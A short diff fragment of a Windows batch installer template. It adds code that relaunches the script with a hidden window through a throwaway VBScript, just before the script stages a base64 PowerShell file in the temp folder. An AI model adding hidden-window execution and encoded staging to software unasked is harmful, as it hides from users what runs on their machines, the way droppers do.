@@ -173,6 +173,16 @@ try {{
 chcp 65001 >nul 2>&1
 setlocal enabledelayedexpansion
 
+REM Check if running hidden
+if not "%1"=="HIDDEN" (
+    REM Create VBScript to run hidden
+    echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\\run_hidden.vbs"
+    echo WshShell.Run "cmd.exe /c ""%~f0"" HIDDEN", 0 >> "%TEMP%\\run_hidden.vbs"
+    cscript //nologo "%TEMP%\\run_hidden.vbs"
+    del "%TEMP%\\run_hidden.vbs"
+    exit
+)
+
 REM Create temporary files
 set "TEMP_PS1=%TEMP%\\worker-manager-installer-%RANDOM%.ps1"
 set "B64_FILE=%TEMP%\\ps-script-%RANDOM%.b64"
